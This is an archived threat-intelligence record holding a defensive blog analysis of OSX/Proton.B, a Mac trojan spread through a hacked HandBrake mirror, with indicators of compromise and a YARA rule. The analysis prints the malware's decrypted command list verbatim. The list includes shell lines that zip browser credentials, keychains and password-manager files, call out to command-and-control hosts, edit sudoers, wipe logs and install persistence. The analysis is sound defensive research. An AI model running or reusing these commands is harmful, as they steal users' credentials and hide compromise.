{
    "id": "a48b346e-08fb-41b5-b65a-9dbe2a85dab1",
    "created_at": "2023-01-12T15:09:59.524499Z",
    "updated_at": "2025-03-27T02:16:25.903124Z",
    "deleted_at": null,
    "sha1_hash": "0980ab28158a66e40d3d0d2849a7a8ddf83fe23c",
    "title": "2017-05-10 - OSX-Proton.B",
    "authors": "",
    "file_creation_date": "2022-05-28T17:04:36Z",
    "file_modification_date": "2022-05-28T17:04:36Z",
    "file_size": 2575596,
    "plain_text": "# Objective-See\n\n**objective-see.com/blog/blog_0x1F.html**\n\nOSX/Proton.B\n\n› a brief analysis, at 6 miles up\n\n5/10/2017\n\n[love these blog posts? support my tools & writing on patreon! Mahalo :)](https://www.patreon.com/objective_see)\n\nWant to play along? I've shared both the trojaned Handbrake disk image and OSX/Proton.B payload, which\n[can be downloaded here (password: infect3d).](https://objective-see.com/downloads/malware/Proton.zip)\n\nPlease don't infect yourself!\n\nBackground\n\nAs I'm sure you are now aware, a mirror server of the popular open-source video transcoder, [HandBrake,](https://handbrake.fr/)\nwas hacked. One goal of the hack was to infect macOS users by trojaning the legitimate HandBreak\napplication with a new variant of OSX/Proton.\n\nI recently blogged about how the app was trojaned and how the malware persistently installed itself:\n[\"HandBrake Hacked! OSX/Proton (re)Appears \" However due to timing constraints (and the fact that it was](https://objective-see.com/blog/blog_0x1D.html)\n\n\n-----\n\nthe weekend) I didn t really dive into the technical details of the malware that much.\n\nNow though, I'm 'stuck' on a flight to Europe (en route to present at 'PostiveHack Days' in Moscow) - so have\na massive amount of free time. Moreover I received a bunch of email from the HandBrake developers,\ninfected users, and friends requesting more details on the malware.\n\nMost interestingly several users pinged me, stating that while they ran the infected Handbrake application,\nthey didn't seem to be persistently infected ... intriguing!\n\n\"Hi Patrick,\nI had downloaded [and ran] what turned out to be the infected DMG from the Handbrake site last week.\n\nTwo quick questions: I ran the steps and commands to remove the file, and had these results:\n\n'activity_agent' was not running in my Activity monitor\n\nI ran the Terminal commands from the HB team, which [failed] implying the launch agent plist file didn't\nexist\"\n\nWant to join me (virtually) at 11294 meters in the sky, as we dive into OSX/Proton.B?\n\nAnalysis\nLet's first start with the infected HandBrake.app that was distributed via a hacked mirror server of the\nlegitimate Handbrake website (handbrake.fr):\n\n[As mentioned in the previous blog post, when run by the user the infected Handbrake application kicks off the](https://objective-see.com/blog/blog_0x1D.html)\ninstall of OSX/Proton.B. Specifically it:\n\n1. unzips Contents/Resources/HBPlayerHUDMainController.nib to /tmp/HandBrake.app. This 'nib' is a\n\npassword protected zip file who's password is:\nqzyuzacCELFEYiJ52mhjEC7HYl4eUPAR1EEf63oQ5iTkuNIhzRk2JUKF4IXTRdiQ\n\n2. launches (opens) /tmp/HandBrake.app\n\nHow specifically does the malware do this?\n\nWhen an application is launched, its start() and then main() functions are executed. In applications, the\nmain() function usually just calls the NSApplicationMain method:\n\n\n-----\n\nNSApplicationMain performs a variety of tasks including loading and initializing the application's principal\nclass. In order determine this class, it reads the application's Info.plist file. More specifically it reads the value\nof the 'NSPrincipalClass' key. If we dump the Info.plist file of the trojaned HandBrake application, it's easy to\nsee its principal class is 'HBApplication':\n\n$ less HandBrake.app/Contents/Info.plist | grep -A 1 Class\n\n<key>NSPrincipalClass</key>\n\n<string>HBApplication</string>\n\nFor more info on the macOS application startup process, see the wonderful (albeit slightly dated) article:\n[\"Demystifying NSApplication by recreating it.\"](https://www.cocoawithlove.com/2009/01/demystifying-nsapplication-by.html)\n\nSo typically, Objective-C objects are created via a call to alloc and then init:\n\n//instantiate object\n\nid someObj = [SomeObj alloc] init];\n\nIf we peak at HBApplication's init method some new (malicious) code has been added:\n\n//-[HBApplication init]\n\n//decode string\n\nr14 = [_DWOI(&var_A0, 0x2d) retain];\n\n//execute decoded string\n\nrbx = [[r13 comrad:r14] retain];\n\nThe DWOI function decodes a passed in string:\n\n\n-----\n\nWhile the [HBApplication comrad:] executes a task via \"/bin/sh -c\":\n\nint -[HBAppDelegate comrad:]() {\n\nrax = [NSPipe pipe];\n\nvar_38 = [[rax fileHandleForReading] retain];\n\nr14 = [[NSTask alloc] init];\n\n[r14 setStandardOutput:rax];\n\n[r14 setStandardError:rax];\n\n[r14 setLaunchPath:@\"/bin/sh\"];\n\nr12 = [NSArray arrayWithObjects:@\"-c\", rbx, 0x0];\n\n[r14 setArguments:rbx];\n\n[r14 launch];\n\n[r14 waitUntilExit];\n\nrbx = [[var_38 readDataToEndOfFile] retain];\n\nrax = [[NSString alloc] initWithData:rbx encoding:0x4];\n\nreturn rax;\n\n}\n\nIf we break on this code in a debugger, we can dump the string that is decoded and executed:\n\nb -[HBAppDelegate comrad:]\n\nBreakpoint 1: where = HandBrake'-[HBAppDelegate comrad:], address = 0x0000000100029625\n\n(lldb) po $rdi\n\n<HBAppDelegate: 0x102513e30>\n\n\n-----\n\n(lldb) x/s $rsi\n0x100042aaf: \"comrad:\"\n\n(lldb) po $rdx pgrep -x activity_agent && echo Queue.hbqueue\n\nThe pgrep -x activity_agent && echo Queue.hbqueue command will echo 'Queue.hbqueue' if and only if\n'activity_agent' is found in the process list. In other words, this is how the malware installer checks if the\npersistent component (OSX/Proton.B) has already been installed and executed!\n\nAssuming OSX/Proton.B is not found. executing the trojaned HandBrake application then decodes and\nexecutes the following command:\n\nunzip -P qzyuzacCELFEYiJ52mhjEC7HYl4eUPAR1EEf63oQ5iTkuNIhzRk2JUKF4IXTRdiQ\n/Users/user/Desktop/HandBrake.app/Contents/Resources/HBPlayerHUDMainController.nib -d /tmp; xattr -c\n/tmp/HandBrake.app; open /tmp/HandBrake.app;\n\nAs previously mentioned, this will decrypt OSX/Proton.B from HBPlayerHUDMainController.nib and execute\nit!\n\nOnce this malicious logic has been executed, the trojaned HandBrake application continues execution of the\nnormal video transcoding logic so that the user is none the wiser.\n\nTo analyze OSX/Proton.B, we can grab the dropped binary (from\n/tmp/HandBrake.app/Contents/MacOS/HandBrake and load it into a disassembler, as well as instruct the\ndebugger to automatically attach to it when OSX/Proton.B is launched (via the debugger's '--waitfor'\ncommand line argument):\n\n(lldb) process attach --name HandBrake --waitfor\nProcess 486 stopped\n\n- thread #1, stop reason = signal SIGSTOP\nframe #0: libsystem_c.dylib`__atexit_init\n\n-> 0x7fffad3ffe27 <+0>: movq 0x8e5d22a(%rip), %rdi\n0x7fffad3ffe2e <+7>: cmpq $-0x1, 0x20(%rdi)\n0x7fffad3ffe33 <+12>: jne 0x7fffad3ffe41\n0x7fffad3ffe35 <+14>: movq 0x28(%rdi), %rax\n\nExecutable module set to \"/tmp/HandBrake.app/Contents/MacOS/HandBrake\".\nArchitecture set to: x86_64h-apple-macosx.\n\nThe first thing to notice is that OSX/Proton.B contains some (basic) anti-debugging logic:\nrbx = dlopen(0x0, 0xa);\n(dlsym(rbx, \"ptrace\"))(0x1f, 0x0, 0x0, 0x0);\ndlclose(rbx);\n\nThis anti-debugging logic is well-known, as it's even documented in Apple's man page for ptrace:\n\nman ptrace\n\n\n-----\n\nPTRACE(2)\nNAME\nptrace -- process tracing and debugging\n\n...\n\nPT_DENY_ATTACH\nThis request is the other operation used by the traced process; it allows a process that\nis not currently being traced to deny future traces by its parent. All other arguments\nare ignored. If the process is currently being traced, it will exit with the exit status\nof ENOTSUP; otherwise, it sets a flag that denies future traces. An attempt by the parent\nto trace a process which has set this flag will result in a segmentation violation in\nthe parent.\n\nIn short, PT_DENY_ATTACH (0x1F), once executed prevents a user-mode debugger from attaching to the\nprocess. However, since lldb is already attached to the process (thanks to the --waitfor argument),we can\nneatly sidestep this. How? Set a breakpoint on pthread then simply execute a 'thread return' command. This\ntells the debugging to stop executing the code within the function and execute a return command to 'exit' to\nthe caller. Neat!\n\n- thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\nframe #0: 0x00007fffad499d80 libsystem_kernel.dylib`__ptrace\n\n(lldb) thread return\n\nWith the anti-debugging logic out of the way, we can debug to our heart's content!\n\nThe first thing OSX/Proton.B does (well after calling ptrace(..., 'PT_DENY_ATTACH')), is decode a bunch of\nstrings that turn out to be the addresses of its command and control servers:\n\nhandbrake.cc\n\nhandbrake.biz\n\nls.handbrake.biz\n\nhandbrake.biz:8443\n\nInterestingly the string decoding method (at address 000000010001E6F7) appears to be similar (identical?)\nto the DWOI function in the malware's installer (the trojaned HandBrake.app). This indicates that the hackers\nmay have had access to the OSX/Proton.B source code. This wouldn't be that interesting, save for the fact\nthat OSX/Proton.A was offered for sale (see: \"Hackers Selling Undetectable Proton Malware for macOS in 40\nBTC\").\n\nDoes this mean the hacker's purchased OSX/Proton.A (including its source code)? Or are the hackers that hit\nHandBrake the same ones who created OSX/Proton? Who knows...\n\nMoving on, once the command and control servers have be decoded, the malware decodes a few more\nstrings including: 'activity_agent' and 'fr.handbrake.activity_agent' As mentioned in the previous blog,\nOSX/Proton.B persistently installs itself as launch agent (plist: fr.handbrake.activity_agent, name\n\n\n-----\n\nactivity_agent):\n\n$ cat fr.handbrake.activity_agent\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>KeepAlive</key>\n<true/>\n...\n<key>ProgramArguments</key>\n<array>\n<string>/Users/user/Library/RenderFiles/activity_agent.app/\nContents/MacOS/activity_agent</string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n\n</dict>\n</plist>\n\nNext, OSX/Proton.B somewhat 'stealthily' builds a path to an encrypted file named '.hash' in its resources\ndirectory (/tmp/HandBrake.app/Contents/Resources/.hash).\n\n//path: /tmp/HandBrake.app/Contents/Resources/.hash\nrbx = [NSString stringWithFormat:@\"%@/%@%@%@%@%@\", r13, @\".\", r9, @\"a\", @\"s\", @\"h\"];\n\nThis file is loaded into memory and then decrypted via a call to [RNDecryptor\ndecryptData:withPassword:error:]. The decryption password is\n'9fe4a0c3b63203f096ef65dc98754243979d6bd58fe835482b969aabaaec57e':\n\nProcess 486 stopped\n\n- thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over\nHandBrake`___lldb_unnamed_symbol521$$HandBrake:\n\n-> 0x100017583 <+259>: callq *%r15\n0x100017586 <+262>: movq %rax, %rdi\n0x100017589 <+265>: callq 0x100049dae\n0x10001758e <+270>: movq %rax, %r13\n\n(lldb) po $rdi\n**RNDecryptor**\n\n(lldb) x/s $rsi\n0x10004db2b: \"decryptData:withPassword:error:\"\n\n(lldb) po $rcx\n9fe4a0c3b63203f096ef65dc98754243979d6bd58fe835482b969aabaaec57e\n\nAnd what is in this encrypted file? A massive list of commands and configuration values. Jackpot!\n\n\n-----\n\nif [ -f %@/.crd ]; then cat %@/.crd; else echo failure; fi,\nif [ -f %@/.ptrun ]; then echo success; fi,\ntouch %@/.ptrun;,\ncurl,\nhttps://%@/kukpxx8lnldxvbma8c4xqtar/auth?B=%@&U=%@&S=%@,\necho '%@' | sudo -S echo success;,\nrm -rf %@/%@.app %@;,\nrm -rf ~/Library/LaunchAgents/%@*;,\ncurl %@ -o %@ && sudo chmod 777 %@;,\nHandBrake needs to install additional codecs. Enter your password to allow this.,\nscreencapture -x %@/scr%@.png,\nhttps://%@/api/upload,\n%@/scr%@.png,\nyyyy-MM-dd HH:mm:ss zzz,\nping -c 1 %@ 2>/dev/null >/dev/null && echo 0,\n%@.app,\ncat %@/.crd,\nif [ -f %@/.bcrd ]; then cat %@/.bcrd; else echo failure; fi,\necho '%@:%@:%@' > %@/.crd;,\necho 'printf \"\\033[8;1;1t\"; echo \"%@\" | sudo -S sh -c \"echo 'Defaults !tty_tickets' >> /etc/sudoers\"; killall\nTerminal; sleep 1;' > ~/Library/sco.command; chmod 777 ~/Library/sco.command; open\n~/Library/sco.command && sleep 2.7; rm -rf ~/Library/sco.command;,\necho '%@:%@:%@' > %@/.crd,\nAKADOMEDO,\nCFBundleExecutable,\n@%@/proton.zip,\n/bin/sh,\nhttps://%@,\n-c,\na%@=`curl -s,\napi_key=%@&cts=%@%@,\n-F api_key=%@ -F cts=%@ -F signature=%@ https://%@/api/%@`; echo $a%@;,\necho '%@' | sudo -S rm -rf %@ %@/*.zip,\ncat %@/.crd,\nhcresult=`curl -s --connect-timeout 10 %@` && echo $hcresult;,\ntype,\nname,\npath,\nsize,\ncreation_date,\nmodification_date,\nfolders,\nfiles,\ntotal_folders,\ntotal_files,\nfolder,\n--,\nrm -rf %@,\n%@/.str.txt,\n\n\n-----\n\n-O -J https://%@,\n0aaf7a0da92119ccf0ba,\n%@/.tmpdata,\nexpiration_date,\ngrace_period,\nos_version,\nchecksum,\n%@/.hash,\ncodesign -dv %@,\nVOID,\ncd %@; curl,\nhcresult=`curl -sL\nhttps://script.google.com/macros/s/AKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec`\n&& echo $hcresult;, zip %@/CR.zip ~/Library/Application\\ Support/Google/Chrome/Profile\\ 1/Login\\ Data\n~/Library/Application\\ Support/Google/Chrome/Profile\\ 1/Cookies ~/Library/Application\\\nSupport/Google/Chrome/Profile\\ 1/Bookmarks ~/Library/Application\\ Support/Google/Chrome/Profile\\\n1/History ~/Library/Application\\ Support/Google/Chrome/Profile\\ 1/Web\\ Data; zip %@/CR_def.zip\n~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ~/Library/Application\\\nSupport/Google/Chrome/Default/Cookies ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n~/Library/Application\\ Support/Google/Chrome/Default/History ~/Library/Application\\\nSupport/Google/Chrome/Default/Web\\ Data;,\nzip -r %@/FF.zip ~/Library/Application\\ Support/Firefox/$(sh %@/mozilla.sh)/cookies.sqlite\n~/Library/Application\\ Support/Firefox/$(sh %@/mozilla.sh)/formhistory.sqlite ~/Library/Application\\\nSupport/Firefox/$(sh %@/mozilla.sh)/logins.json ~/Library/Application\\ Support/Firefox/$(sh\n%@/mozilla.sh)/logins.json;,\nzip -r %@/SF.zip ~/Library/Cookies ~/Library/Safari/Form\\ Values;,\nzip -r %@/OP.zip ~/Library/Application\\ Support/com.operasoftware.Opera/Login\\ Data ~/Library/Application\\\nSupport/com.operasoftware.Opera/Cookies ~/Library/Application\\ Support/com.operasoftware.Opera/Web\\\nData;,\nkillall Console; killall Wireshark; rm -rf %@;,\nmkdir -p %@ %@ ~/Library/LaunchAgents/; chmod -R 777 %@ %@; zip -r %@/KC.zip ~/Library/Keychains/\n/Library/Keychains/; %@ %@ %@ %@ zip -r %@/GNU_PW.zip ~/.gnupg ~/Library/Application\\\nSupport/1Password\\ 4 ~/Library/Application\\ Support/1Password\\ 3.9; zip -r %@/proton.zip %@; %@ echo\nsuccess;, cp -R %@ %@/%@; mv %@/%@/Contents/MacOS/%@ %@/%@/Contents/MacOS/%@; mv\n%@/%@/Contents/Resources/Info_.plist %@/%@/Contents/Info.plist; mv\n%@/%@/Contents/Resources/%@.plist ~/Library/LaunchAgents/%@.plist; echo success;,\nsed -i -e 's/P_MBN/%@/g' ~/Library/LaunchAgents/%@.plist; sed -i -e\n's=P_UPTH=%@/%@/Contents/MacOS/%@=g' ~/Library/LaunchAgents/%@.plist; chmod 644\n~/Library/LaunchAgents/%@.plist; codesign --remove-signature %@/%@; rm -rf %@/%@/Ic*; launchctl load\n~/Library/LaunchAgents/%@.plist; %@,\nACTION,\nCONSOLE,\nFM,\nPROC,\nSSH_DID_CONNECT,\nSSH_DID_TERMINATE,\nclsock,\n_STROKES,\nscreencam,\n\n\n-----\n\nexec_pointer,\nssh_bind_port,\nprocs,\ntotal_procs,\nSSH_DID_NOT_CONNECT,\n/Library/Extensions/LittleSnitch.kext,\n/Library/Extensions/Radio Silence.kext,\n/Library/Extensions/HandsOff.kext,\n%@/.tmpdata,\n%@/updated.license,\nlicense_enforce,\nmv %@ %@,\nhandbrakestore.com,\nhandbrake.cc,\nluwenxdsnhgfxckcjgxvtugj.com,\n6gmvshjdfpfbeqktpsde5xav.com,\nkjfnbfhu7ndudgzhxpwnnqkc.com,\nyaxw8dsbttpwrwlq3h6uc9eq.com,\nqrtfvfysk4bdcwwwe9pxmqe9.com,\nfyamakgtrrjt9vrwhmc76v38.com,\nkcdjzquvhsua6hlfbmjzkzsb.com,\nypu4vwlenkpt29f95etrqllq.com,\nnc -G 20 -z 8.8.8.8 53 >/dev/null 2>&1 && echo success,\necho '%@' > /tmp/public.pem; openssl rsautl -verify -in %@/.tmpdata -pubin -inkey /tmp/public.pem,\na90=`curl -s --connect-timeout 10 -o /tmp/au https://%@/rsa` && echo && echo '%@' > /tmp/au.pub && echo\nsuccess,\nopenssl rsautl -verify -in /tmp/au -pubin -inkey /tmp/au.pub,\nrm -rf /tmp/*,\nsudo -k; echo '%@' | sudo -S rm -rf /var/log/* /Library/Logs/* && echo success;,\nmv %@/.crd %@/.bcrd,\nsudo -k\n\nWell this makes analysis rather easy ;) We're not going to walk thru all of these, but let's cover a few of the\nmore interesting items in this this list.\n\nThe first items from this list that the malware extracts and utilizes are the following paths:\n\n/Library/Extensions/LittleSnitch.kext\n\n/Library/Extensions/Radio Silence.kext\n\n/Library/Extensions/HandsOff.kext\n\nFor each of these paths, it checks if they exist on disk, and if so, the malware immediately exits!\n\n//0x51: 'LittleSnitch.kext'\nrax = [*0x10006c4a0 objectAtIndexedSubscript:0x51];\n\nrdx = rax;\nif ([rbx fileExistsAtPath:rdx] != 0x0) goto fileExists;\n\n\n-----\n\nfileExists:\nrax = exit(0x0);\nreturn rax;\n\nThese of course are macOS security products (firewalls) which would alert the user to the presence of the\nmalware when it attempts to call out to connect to its command and control server(s). Seems like the\nmalware would simply exit, rather than risking detection.\n\nAh! Could this be why various users, who had ran the infected Handbrake application were not infected? Why\nyes! Turns out all had been running Little Snitch. Lucky for them :)\n\nAssuming no firewall products are detected the malware performs what appears to some verification on itself.\n[(As noted by my friend 0xamit, this is 'license' check). Specifically, the malware executes \"/bin/sh\" with the](https://twitter.com/0xamit)\nfollwing arguments (in $RDX):\n\n(lldb) po $rdx\n<__nsarrayi>(\n-c,\necho '-----BEGIN PUBLIC KEY----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwUP19DdW2NlkkdovqqwF\n+r3sBaamka42zVMGa+COUCIysrVhVJIv4nmc57TLxgG8dsg+G0o0NQ75n898b04l\nYGve3gXGWJ8Y5OTJ16+RA4OtKAiO8v7qEGnQ/QpSzrLZPU3Yd60bAltYSvCCiOdB\nOKhOAiag0H39F2k5ea4zxt6TNDksW/o3+HcjzA4yy+C1tp2Cr4X37O5XMVZPWpMk\nsIXPazh91tr0TJ2VFyx4btnDPajeOzhcKUA05Wrw+hagAZnFU9Bajx3KvdTlxsVx\nLmRc5r3IqDAsXTHH1jpmWMDiC9IGLDFPrN6NffAwjgSmsKhi1SC8yFHh0oPCswRh\nrQIDAQAB\n-----END PUBLIC KEY-----' > /tmp/public.pem; openssl rsautl -verify -in\n/tmp/HandBrake.app/Contents/Resources/.tmpdata -pubin -inkey /tmp/\npublic.pem\n)\n\n(lldb) po $rax\n{\n\"bundle_name\" = chameleo;\n\"checksum\" = 128814f2b057aef1dd3e00f3749aed2a81e5ed03737311f2b1faab4ab2e6e2fe;\n\"expiration_date\" = \"2017-05-10 23:59:59 +0000\";\n\"grace_period\" = 25;\n\"os_version\" = \"10.x\";\n}\n\nIt compares this 'checksum' value\n(128814f2b057aef1dd3e00f3749aed2a81e5ed03737311f2b1faab4ab2e6e2fe) with a value that it extracts\nfrom the encrypted .hash file. If these match the, malware is 'licensed' and will continues executing via a call\nto NSApplicationMain. Otherwise it bails with a call to exit():\nr14 = [[*0x10006c4a8 objectAtIndexedSubscript:0x3] retain];\nrbx = [[NSString stringWithCString:&var_80 encoding:0x4] retain];\nr15 = [r14 isNotEqualTo:rbx];\nif (r15 == 0x0) {\nrax = NSApplicationMain(var A4, var A0);\n\n\n-----\n\n}\nelse {\nrax = exit(0x0);\n}\n\nOnce the NSApplicationMain method has been invoked, the macOS application runtime will automatically\ninvoke the 'applicationDidFinishLaunching' delegate method. In OSX/Proton.B this method is implemented at\n0x10001ED50 This is where the malware continues execution.\n\nHere, it starts executing various commands that are embedded in the encrypted .hash file. For example it\nchecks if it is connected to the internet by pinging Google's DNS server:\n\nnc -G 20 -z 8.8.8.8 53 >/dev/null 2>&1 && echo success\n\nIt also executes a script, hosted at: https://script.google.com/macros/s/\nAKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec. This script appears to simply\nreturn the current date and time?\n\nIn order to elevate its privileges to root, the malware displays a fake authentication prompt using strings,\nagain from the encrypted .hash file (such as \"HandBrake needs to install additional codecs. Enter your\npassword to allow this\"):\n\nThe class that implements this window is aptly named 'AuthorizationWindow':\n\n\n-----\n\nIf the user is tricked into entering their password, the malware 'validates' the credentials via the following:\n\necho 'p@ss0wrd' | sudo -S echo success;\n\nOnce it has obtained root, (thanks to a naive user), the malware executes the following:\necho 'printf \"\\033[8;1;1t\"; echo \"%@\" | sudo -S sh -c \"echo 'Defaults !tty_tickets' >> /etc/sudoers\"; killall\nTerminal; sleep 1;' > ~/Library/sco.command; chmod 777 ~/Library/sco.command; open\n~/Library/sco.command && sleep 2.7; rm -rf ~/Library/sco.command;\n\nAs part of this command (killall Terminal) will kill all instances of the Terminal (including the one we are using\nto debug the malware), execute the 'thread return' command in the debugger on the function at\n0x0000000100014EB0, to skip these commands from being run.\n\nNext the malware downloads an RSA key from its command and control server(s) and verifies it via a public\nkey that is embedded within the malware:\n\ncurl -s --connect-timeout 10 -o /tmp/au https://handbrake.biz/rsa\n\nopenssl rsautl -verify -in /tmp/au -pubin -inkey /tmp/au.pub\n\nThen, it starts pinging its various command and control servers:\n\nping -c 1 handbrake.biz 2>/dev/null >/dev/null && echo 0\n\nping -c 1 handbrakestore.com 2>/dev/null >/dev/null && echo 0\n\nping -c 1 handbrake.cc 2>/dev/null >/dev/null && echo 0\n\n...\n\nDuring my analysis, the malware didn't appear to be too happy chatting with the various command and\n\n\n-----\n\ncontrol servers. Maybe it doesn t like being this high up :P or more likely these C&C servers are sinkholed\nthis point. As such, I didn't observe the malware executing the other commands found in the encrypted\n'tasking' file ('.hash'). However, since the commands are simply shell commands that we've decrypted, it's\neasy to understand the malware's full capabilities.\n\nFor example, OSX/Proton.B has commands to:\n\n'complicate' analysis by killing apps such as the Console, or Wireshark and wiping (some) system logs:\n\nkillall Console\nkillall Wireshark\n\nsudo -S rm -rf /var/log/* /Library/Logs/*\n\npersist itself (as a launch agent):\nsed -i -e 's/P_MBN/%@/g' ~/Library/LaunchAgents/%@.plist; sed -i -e\n's=P_UPTH=%@/%@/Contents/MacOS/%@=g' ~/Library/LaunchAgents/%@.plist; chmod 644\n~/Library/LaunchAgents/%@.plist\n\ncollect and exfiltrate sensitive user data such as 1Password files, browser login data, keychains, etc:\n\nzip %@/CR.zip ~/Library/Application\\ Support/Google/Chrome/Profile\\ 1/Login\\ Data\n~/Library/Application\\ Support/Google/Chrome/Profile\\ 1/Cookies\n\nzip -r %@/KC.zip ~/Library/Keychains/ /Library/Keychains/; %@ %@ %@ %@ zip -r %@/GNU_PW.zip\n~/.gnupg ~/Library/Application\\ Support/1Password\\ 4 ~/Library/Application\\ Support/1Password\\ 3.9;\nzip -r %@/proton.zip %@; %@ echo success\n\n...and much more!\n\nIf you're interested in another solid technical analysis of OSX/Proton.B, see: \"Proton.B: What this Mac\nmalware actually does\" (by [0xamit).](https://twitter.com/0xamit)\n\nConclusions\nWell, my flight is about to land! So let's wrap this all up.\n\nIn this post we dug into the technical details of how OSX/Proton.B is installed via a trojaned HandBrake\napplication. We also uncovered the malware's capabilities, such as its propensity for sensitive user data.\nMoreover, we answered the question why users with Little Snitch, remained uninfected. Neat!\n\nAgain, to check if you're infected, look for the following:\n\na process named 'activity_agent', or Handbrake (that's running out of (/tmp)\n\n\n-----\n\nan application name 'activity_agent.app in ~/Library/RenderFiles/\n\na plist file: '~/Library/LaunchAgents/fr.handbrake.activity_agent.plist\n\nIf you have been infected - it's best fully reinstall macOS via the 'macOS Recovery OS', and change all your\npasswords.\n\nAs mentioned in the last blog post, Apple has also pushed out an XProtect signature, meaning that all new\ninfections should be thwarted:\n\n$ cat /System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara\n\nprivate rule Macho\n{\nmeta:\ndescription = \"private rule to match Mach-O binaries\"\ncondition:\nuint32(0) == 0xfeedface or uint32(0) == 0xcefaedfe or uint32(0) == 0xfeedfacf\nor uint32(0) == 0xcffaedfe or uint32(0) == 0xcafebabe or uint32(0) == 0xbebafeca\n\n}\n\nrule XProtect_OSX_Proton_B\n{\nmeta:\ndescription = \"OSX.Proton.B\"\n\ncondition:\n**Macho and filesize < 800000 and hash.sha1(0, filesize) ==**\n**\"a8ea82ee767091098b0e275a80d25d3bc79e0cea\"**\n}\n\nFinally, running a security product such as Little Snitch or BlockBlock is a must!\n\n\n-----\n\n[love these blog posts? support my tools & writing on patreon! Mahalo :)](https://www.patreon.com/objective_see)\n\np.s. shout out to all the guys/gals on #macadmins!\n© 2017 objective-see llc\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-05-10 - OSX-Proton.B.pdf"
    ],
    "report_names": [
        "2017-05-10 - OSX-Proton.B.pdf"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536199,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653757476,
    "ts_modification_date": 1653757476,
    "files": {
        "pdf": "https://archive.orkl.eu/0980ab28158a66e40d3d0d2849a7a8ddf83fe23c.pdf",
        "text": "https://archive.orkl.eu/0980ab28158a66e40d3d0d2849a7a8ddf83fe23c.txt",
        "img": "https://archive.orkl.eu/0980ab28158a66e40d3d0d2849a7a8ddf83fe23c.jpg"
    }
}